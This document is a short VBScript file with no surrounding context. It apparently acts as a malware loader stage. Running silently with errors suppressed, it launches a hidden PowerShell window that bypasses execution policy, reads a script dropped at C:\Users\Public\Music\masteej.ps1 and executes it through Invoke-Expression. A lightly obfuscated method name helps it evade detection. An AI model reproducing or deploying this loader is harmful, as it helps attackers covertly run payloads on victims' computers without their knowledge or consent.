on error resume next
Set objShell = CreateObject("Wscript.Shell")
objShell.Run("Powershell -ExecutionPolicy Bypass $a='ReadAllText';$T='C:\Users\Public\Music\masteej.ps1';IEx([IO.File]::$a($T))"),0